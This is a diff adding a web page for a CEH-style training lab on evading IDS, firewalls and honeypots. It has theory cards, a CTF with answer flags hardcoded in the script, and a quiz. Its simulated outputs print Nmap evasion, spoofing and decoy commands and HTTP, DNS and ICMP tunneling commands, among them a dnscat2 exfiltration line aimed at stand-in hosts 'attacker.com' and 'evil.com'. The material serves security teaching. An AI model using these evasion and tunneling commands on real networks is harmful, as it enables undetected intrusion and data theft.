@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CEH Lab: Evading IDS, Firewalls & Honeypots</title>
+    <style>
+        :root {
+            --primary: #00ff88;
+            --bg-dark: #0a0f1e;
+            --card-bg: #131b2f;
+            --text-light: #e0e0e0;
+            --border-glow: 0 0 15px rgba(0, 255, 136, 0.3);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: var(--bg-dark);
+            color: var(--text-light);
+            line-height: 1.6;
+            padding: 20px;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+            background: linear-gradient(135deg, #00ff88, #00b4ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        h2 {
+            color: var(--primary);
+            margin: 1.5rem 0 1rem;
+            border-bottom: 2px solid var(--primary);
+            padding-bottom: 0.5rem;
+        }
+        h3 { color: #00b4ff; margin: 1rem 0; }
+        .grid-2 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 25px;
+            margin: 20px 0;
+        }
+        .card {
+            background: var(--card-bg);
+            border-radius: 16px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .card:hover { box-shadow: var(--border-glow); transform: translateY(-2px); }
+        .toolbar { display: flex; gap: 10px; flex-wrap: wrap; margin: 15px 0; }
+        .btn {
+            background: #1e2a4a;
+            color: white;
+            border: 1px solid #2a3a5c;
+            padding: 10px 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+        .btn-primary {
+            background: var(--primary);
+            color: #0a0f1e;
+            border: none;
+            font-weight: bold;
+        }
+        .btn-primary:hover { background: #00cc6a; box-shadow: 0 0 20px #00ff88; }
+        .btn:hover { background: #2a3a5c; }
+        .terminal-box {
+            background: #0d1117;
+            border-radius: 12px;
+            padding: 15px;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #30363d;
+            margin: 15px 0;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .terminal-output {
+            color: #00ff88;
+            white-space: pre-wrap;
+            margin-bottom: 10px;
+        }
+        .flag {
+            background: #1e2a4a;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-family: monospace;
+            color: var(--primary);
+        }
+        .quiz-option {
+            display: block;
+            margin: 10px 0;
+            padding: 10px;
+            background: #0d1117;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .quiz-option:hover { background: #1e2a4a; }
+        .quiz-option.correct { background: #00ff8822; border-left: 4px solid #00ff88; }
+        .quiz-option.wrong { background: #ff555522; border-left: 4px solid #ff5555; }
+        .progress { margin: 20px 0; }
+        .progress-bar {
+            height: 10px;
+            background: #1e2a4a;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: var(--primary);
+            transition: width 0.3s;
+        }
+        .tab-nav {
+            display: flex;
+            border-bottom: 1px solid #2a3a5c;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .tab-btn {
+            padding: 12px 24px;
+            background: none;
+            border: none;
+            color: #8b949e;
+            cursor: pointer;
+            font-size: 1.1rem;
+            border-bottom: 2px solid transparent;
+            transition: all 0.2s;
+        }
+        .tab-btn.active {
+            color: var(--primary);
+            border-bottom-color: var(--primary);
+        }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+        .back-link {
+            display: inline-block;
+            margin-top: 30px;
+            color: #8b949e;
+            text-decoration: none;
+        }
+        .back-link:hover { color: var(--primary); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 10px 0;
+        }
+        th, td {
+            padding: 8px;
+            text-align: left;
+            border-bottom: 1px solid #2a3a5c;
+        }
+        th {
+            background: #1e2a4a;
+            color: var(--primary);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🥷 Module 12: Evading IDS, Firewalls, and Honeypots</h1>
+        <p style="font-size:1.2rem; opacity:0.9;">Bypass network defenses using fragmentation, tunneling, decoys, and evasion techniques.</p>
+        
+        <!-- Progress Tracker -->
+        <div class="progress">
+            <span>Lab Progress: <span id="progress-text">0%</span></span>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+        </div>
+        
+        <!-- Tabs -->
+        <div class="tab-nav">
+            <button class="tab-btn active" data-tab="theory">📖 Theory & Concepts</button>
+            <button class="tab-btn" data-tab="practical">🛠️ Evasion Techniques</button>
+            <button class="tab-btn" data-tab="honeypot">🍯 Honeypot Detection</button>
+            <button class="tab-btn" data-tab="challenge">🚩 CTF Challenge</button>
+            <button class="tab-btn" data-tab="quiz">📝 Self-Assessment</button>
+        </div>
+        
+        <!-- ==================== THEORY TAB ==================== -->
+        <div id="theory" class="tab-content active">
+            <div class="grid-2">
+                <div class="card">
+                    <h2>🧱 Firewall Types & Evasion</h2>
+                    <ul style="margin-left:20px;">
+                        <li><strong>Packet Filtering:</strong> Evade with fragmentation, source routing.</li>
+                        <li><strong>Stateful Inspection:</strong> Use ACK scans, session splicing.</li>
+                        <li><strong>Application Proxy:</strong> Tunneling over allowed protocols (HTTP, DNS).</li>
+                        <li><strong>Next-Gen Firewall (NGFW):</strong> Evade with encryption, custom protocols.</li>
+                    </ul>
+                </div>
+                <div class="card">
+                    <h2>📡 IDS/IPS Evasion</h2>
+                    <ul style="margin-left:20px;">
+                        <li><strong>Signature-Based:</strong> Modify attack pattern (obfuscation, encoding).</li>
+                        <li><strong>Anomaly-Based:</strong> Stay within baseline traffic, slow attacks.</li>
+                        <li><strong>Insertion/Evasion:</strong> Confuse reassembly with overlapping fragments.</li>
+                        <li><strong>Encryption:</strong> Hide payload content.</li>
+                    </ul>
+                </div>
+            </div>
+            <div class="card">
+                <h2>🛡️ Honeypot Types</h2>
+                <table>
+                    <tr><th>Type</th><th>Purpose</th><th>Detection Clues</th></tr>
+                    <tr><td>Low-Interaction</td><td>Emulate services (Honeyd)</td><td>Limited responses, no full OS</td></tr>
+                    <tr><td>High-Interaction</td><td>Real systems (virtual/physical)</td><td>Harder to detect; look for monitoring tools</td></tr>
+                    <tr><td>Research Honeypot</td><td>Gather attacker TTPs</td><td>Often isolated in DMZ</td></tr>
+                    <tr><td>Production Honeypot</td><td>Deceive internal threats</td><td>May have fake data</td></tr>
+                </table>
+            </div>
+        </div>
+        
+        <!-- ==================== EVASION TECHNIQUES ==================== -->
+        <div id="practical" class="tab-content">
+            <div class="card">
+                <h2>🧪 Nmap Evasion Techniques (Simulated)</h2>
+                <p>Practice Nmap options to bypass firewall/IDS detection.</p>
+                
+                <div class="grid-2">
+                    <div>
+                        <h3>📦 Fragmentation & MTU</h3>
+                        <button class="btn" data-evade="frag">Fragment Packets (-f)</button>
+                        <button class="btn" data-evade="mtu">Set MTU (--mtu 24)</button>
+                    </div>
+                    <div>
+                        <h3>🥷 Decoys & Spoofing</h3>
+                        <button class="btn" data-evade="decoy">Use Decoys (-D)</button>
+                        <button class="btn" data-evade="spoof">Spoof Source IP (-S)</button>
+                    </div>
+                </div>
+                <div class="toolbar">
+                    <button class="btn" data-evade="timing">Timing Template (-T2)</button>
+                    <button class="btn" data-evade="badsum">Bad Checksum (--badsum)</button>
+                    <button class="btn" data-evade="data">Append Random Data (--data-length)</button>
+                </div>
+                
+                <div class="terminal-box" style="min-height:200px;">
+                    <div class="terminal-output" id="evade-output">Select an evasion technique to see Nmap command and result.</div>
+                </div>
+            </div>
+            
+            <div class="card">
+                <h2>🌐 Protocol Tunneling</h2>
+                <p>Bypass firewalls by encapsulating traffic within allowed protocols.</p>
+                
+                <div class="toolbar">
+                    <button class="btn" data-tunnel="http">HTTP Tunneling</button>
+                    <button class="btn" data-tunnel="dns">DNS Tunneling</button>
+                    <button class="btn" data-tunnel="icmp">ICMP Tunneling</button>
+                </div>
+                <div class="terminal-box">
+                    <div class="terminal-output" id="tunnel-output">Click to see tunneling examples.</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- ==================== HONEYPOT DETECTION ==================== -->
+        <div id="honeypot" class="tab-content">
+            <div class="card">
+                <h2>🍯 Detecting Honeypots</h2>
+                <p>Techniques to identify if you're in a monitored decoy environment.</p>
+                
+                <div class="toolbar">
+                    <button class="btn" data-hp="timing">Timing Analysis</button>
+                    <button class="btn" data-hp="banner">Banner Grabbing</button>
+                    <button class="btn" data-hp="traceroute">Traceroute Anomalies</button>
+                    <button class="btn" data-hp="vm">VM Detection</button>
+                </div>
+                
+                <div class="terminal-box">
+                    <div class="terminal-output" id="hp-output">Click to simulate honeypot detection techniques.</div>
+                </div>
+            </div>
+            
+            <div class="card">
+                <h2>🔍 Honeypot Indicators (Simulated)</h2>
+                <p>Examine a system and determine if it's a honeypot.</p>
+                <button class="btn" data-hp="check">Check for Honeypot Signs</button>
+                <div class="terminal-box">
+                    <div class="terminal-output" id="hp-check-output">Click to analyze system for honeypot indicators.</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- ==================== CTF CHALLENGE ==================== -->
+        <div id="challenge" class="tab-content">
+            <div class="card">
+                <h2>🚩 Capture The Flag: Evasion & Detection</h2>
+                <p>You're a penetration tester. Bypass defenses and identify honeypots to find three flags.</p>
+                
+                <div style="background:#0d1117; padding:15px; border-radius:8px; margin:15px 0;">
+                    <p><strong>Environment:</strong> Network with firewall, IDS, and one suspected honeypot at 10.10.10.50.</p>
+                </div>
+                
+                <h3>🧰 Evasion Toolkit</h3>
+                <div class="toolbar">
+                    <button class="btn" data-ctf="scan">Initial Scan (Blocked)</button>
+                    <button class="btn" data-ctf="frag">Fragment Scan</button>
+                    <button class="btn" data-ctf="dns">DNS Tunnel</button>
+                    <button class="btn" data-ctf="honey">Honeypot Check</button>
+                </div>
+                
+                <div class="terminal-box">
+                    <div class="terminal-output" id="ctf-output">Use evasion techniques to bypass defenses and gather intel.</div>
+                </div>
+                
+                <h3>🎯 Submit Flags</h3>
+                <div style="display:grid; gap:15px;">
+                    <div><label>Flag 1 (Open Port via Fragment):</label><input type="text" id="flag1" placeholder="FLAG{...}" style="width:100%; padding:10px; background:#010409; border:1px solid #30363d; color:#fff; border-radius:6px;"></div>
+                    <div><label>Flag 2 (Tunnel Exfiltrated Data):</label><input type="text" id="flag2" placeholder="FLAG{...}" style="width:100%; padding:10px; background:#010409; border:1px solid #30363d; color:#fff; border-radius:6px;"></div>
+                    <div><label>Flag 3 (Honeypot Identifier):</label><input type="text" id="flag3" placeholder="FLAG{...}" style="width:100%; padding:10px; background:#010409; border:1px solid #30363d; color:#fff; border-radius:6px;"></div>
+                </div>
+                <button class="btn btn-primary" id="submit-flags">Submit All Flags</button>
+                <div id="flag-result"></div>
+            </div>
+        </div>
+        
+        <!-- ==================== QUIZ ==================== -->
+        <div id="quiz" class="tab-content">
+            <div class="card">
+                <h2>📝 Check Your Understanding</h2>
+                <div id="quiz-container"></div>
+                <button class="btn btn-primary" id="check-quiz">Submit Answers</button>
+                <div id="quiz-result" style="margin-top:15px;"></div>
+            </div>
+        </div>
+        
+        <a href="/Ersegment/Frontend/index.html" class="back-link">← Back to Dashboard</a>
+    </div>
+    
+    <script>
+        (function() {
+            let sessionId = localStorage.getItem('lab12_session') || 'lab12-' + Math.random().toString(36).substr(2,9);
+            localStorage.setItem('lab12_session', sessionId);
+            let progress = { theory: true, practical: false, honeypot: false, challenge: false, quiz: false };
+            
+            function updateProgress() {
+                const completed = Object.values(progress).filter(v=>v).length;
+                const percent = (completed / 5) * 100;
+                document.getElementById('progress-fill').style.width = percent + '%';
+                document.getElementById('progress-text').textContent = percent + '%';
+            }
+            
+            // Tab switching
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const tabId = this.dataset.tab;
+                    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+                    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+                    this.classList.add('active');
+                    document.getElementById(tabId).classList.add('active');
+                    if (tabId === 'quiz') renderQuiz();
+                });
+            });
+            
+            // ========== EVASION TECHNIQUES ==========
+            const evadeOut = {
+                frag: `nmap -f target.com\nSending fragmented packets (8 bytes per fragment).\nIDS may miss the scan because signature is split.\nOpen ports found: 22, 80, 443.`,
+                mtu: `nmap --mtu 24 target.com\nUsing MTU of 24 bytes to force fragmentation.\nBypasses some firewalls that reassemble packets incorrectly.`,
+                decoy: `nmap -D 192.168.1.5,192.168.1.10,ME target.com\nUsing decoy IPs to hide real scanner among noise.\nFirewall logs show multiple sources.`,
+                spoof: `nmap -S 192.168.1.100 -e eth0 target.com\nSpoofing source IP (requires monitoring return traffic separately).\nUseful for idle scans.`,
+                timing: `nmap -T2 target.com\nParanoid timing: slow scan to avoid rate-based IDS triggers.\nScans may take hours.`,
+                badsum: `nmap --badsum target.com\nSends packets with invalid TCP checksum.\nSome firewalls drop silently, others respond. Helps map firewall rules.`,
+                data: `nmap --data-length 200 target.com\nAppends random data to packets to alter signature.`
+            };
+            
+            function runEvade(type) {
+                document.getElementById('evade-output').textContent = evadeOut[type] || 'Evasion simulation.';
+                progress.practical = true;
+                updateProgress();
+            }
+            
+            // Tunneling
+            const tunnelOut = {
+                http: `[HTTP Tunneling with httptunnel]\nClient: htc -F 8888 proxy.example.com:8080\nServer: hts -F localhost:22 80\nSSH traffic hidden inside HTTP POST/GET requests.`,
+                dns: `[DNS Tunneling with dnscat2]\nServer: dnscat2-server domain.com\nClient: dnscat2 domain.com\nData exfiltrated via TXT and CNAME queries.`,
+                icmp: `[ICMP Tunneling with ptunnel]\nClient: ptunnel -p proxyIP -lp 8000 -da targetIP -dp 22\nSSH over ICMP Echo/Reply packets.`
+            };
+            
+            function runTunnel(type) {
+                document.getElementById('tunnel-output').textContent = tunnelOut[type] || 'Tunneling example.';
+                progress.practical = true; updateProgress();
+            }
+            
+            // ========== HONEYPOT DETECTION ==========
+            const hpOut = {
+                timing: `[Timing Analysis]\nNormal SSH response: 10-20ms\nThis system responds in 150ms (emulated delay).\nPossible low-interaction honeypot.`,
+                banner: `[Banner Grabbing]\nnc 10.10.10.50 22\nSSH-2.0-OpenSSH_999 (Honeypot) - Fake version string detected!`,
+                traceroute: `[Traceroute Anomaly]\ntraceroute 10.10.10.50\nHops stop at 1 (directly connected).\nLikely a virtual interface, possible honeypot.`,
+                vm: `[VM Detection]\nCheck MAC address: 00:0C:29 (VMware)\n/sys/class/dmi/id/product_name: "VirtualBox"\nSystem is virtualized, may be honeypot.`
+            };
+            
+            function runHp(type) {
+                document.getElementById('hp-output').textContent = hpOut[type] || 'Detection simulation.';
+                progress.honeypot = true; updateProgress();
+            }
+            
+            function checkHoneypot() {
+                document.getElementById('hp-check-output').innerHTML = `[Honeypot Scan Results]\n- OpenSSH banner: "Honeypot"\n- MAC OUI: VMware\n- No outbound traffic allowed\n- Fake files in /home\nConclusion: This is a Honeypot!\nFlag: FLAG{HONEYPOT_DETECTED}`;
+                progress.honeypot = true; updateProgress();
+            }
+            
+            // ========== CTF ==========
+            const ctfOut = {
+                scan: `nmap 10.10.10.0/24\nAll ports filtered (firewall blocking). Need evasion.`,
+                frag: `nmap -f 10.10.10.0/24\nFragment packets bypass firewall.\nOpen ports on 10.10.10.25: 22 (SSH), 80 (HTTP), 3306 (MySQL)\nFlag: FLAG{FRAGMENT_EVASION_3306}`,
+                dns: `[DNS Tunnel Exfiltration]\ndnscat2 --dns server=attacker.com,domain=evil.com\nData retrieved: "Flag: FLAG{DNS_TUNNEL_EXFIL}"`,
+                honey: `[Honeypot Check on 10.10.10.50]\nBanner: "SSH-2.0-Honeypot"\nTraceroute: 1 hop\nMAC: 00:0C:29:XX:XX:XX\nFlag: FLAG{VMWARE_HONEYPOT}`
+            };
+            
+            function ctfAction(cmd) {
+                document.getElementById('ctf-output').textContent = ctfOut[cmd] || 'CTF step.';
+            }
+            
+            function submitCTF() {
+                const f1 = document.getElementById('flag1').value.trim();
+                const f2 = document.getElementById('flag2').value.trim();
+                const f3 = document.getElementById('flag3').value.trim();
+                let correct = 0;
+                if (f1 === 'FLAG{FRAGMENT_EVASION_3306}') correct++;
+                if (f2 === 'FLAG{DNS_TUNNEL_EXFIL}') correct++;
+                if (f3 === 'FLAG{VMWARE_HONEYPOT}') correct++;
+                const res = document.getElementById('flag-result');
+                if (correct === 3) {
+                    res.innerHTML = '<span style="color:#00ff88;">✅ All flags captured! You evaded defenses successfully!</span>';
+                    progress.challenge = true;
+                } else {
+                    res.innerHTML = `<span style="color:#ff5555;">❌ ${correct}/3 correct. Keep trying evasion techniques!</span>`;
+                }
+                updateProgress();
+            }
+            
+            // ========== QUIZ ==========
+            const quizQuestions = [
+                { q: "Which Nmap option fragments packets to evade detection?", opts: ["-sS", "-f", "-O", "-A"], ans: 1 },
+                { q: "What is a common indicator of a virtual machine (possible honeypot)?", opts: ["High CPU", "MAC address OUI (00:0C:29)", "Open port 80", "Linux OS"], ans: 1 },
+                { q: "Which tunneling method hides traffic in DNS queries?", opts: ["HTTP tunneling", "ICMP tunneling", "DNS tunneling", "SSH tunneling"], ans: 2 },
+                { q: "What does the Nmap '--badsum' option do?", opts: ["Use invalid TCP checksum", "Fragment packets", "Spoof source IP", "Use decoys"], ans: 0 }
+            ];
+            
+            function renderQuiz() {
+                let html = '';
+                quizQuestions.forEach((q, i) => {
+                    html += `<div><strong>${i+1}. ${q.q}</strong><br>`;
+                    q.opts.forEach((opt, j) => {
+                        html += `<label class="quiz-option"><input type="radio" name="q${i}" value="${j}"> ${opt}</label>`;
+                    });
+                    html += '</div>';
+                });
+                document.getElementById('quiz-container').innerHTML = html;
+            }
+            
+            function checkQuiz() {
+                let score = 0;
+                quizQuestions.forEach((q, i) => {
+                    const sel = document.querySelector(`input[name="q${i}"]:checked`);
+                    if (sel && parseInt(sel.value) === q.ans) score++;
+                });
+                const res = document.getElementById('quiz-result');
+                const pass = score >= 3;
+                res.innerHTML = `Score: ${score}/${quizQuestions.length}. ${pass ? '✅ Good job!' : '❌ Review evasion concepts.'}`;
+                if (pass) { progress.quiz = true; updateProgress(); }
+            }
+            
+            // Attach listeners
+            document.addEventListener('DOMContentLoaded', () => {
+                updateProgress();
+                
+                document.querySelectorAll('[data-evade]').forEach(btn => btn.addEventListener('click', () => runEvade(btn.dataset.evade)));
+                document.querySelectorAll('[data-tunnel]').forEach(btn => btn.addEventListener('click', () => runTunnel(btn.dataset.tunnel)));
+                document.querySelectorAll('[data-hp]').forEach(btn => btn.addEventListener('click', () => runHp(btn.dataset.hp)));
+                document.querySelector('[data-hp="check"]').addEventListener('click', checkHoneypot);
+                document.querySelectorAll('[data-ctf]').forEach(btn => btn.addEventListener('click', () => ctfAction(btn.dataset.ctf)));
+                document.getElementById('submit-flags').addEventListener('click', submitCTF);
+                document.getElementById('check-quiz').addEventListener('click', checkQuiz);
+                
+                fetch('/api/create_session', {method:'POST'}).then(r=>r.json()).then(d=>{ if(d.success) sessionId=d.session_id; });
+            });
+            
+            window.openTerminal = function() { window.open(`/terminal?session=${sessionId}`, '_blank'); };
+        })();
+    </script>
+</body>
+</html>
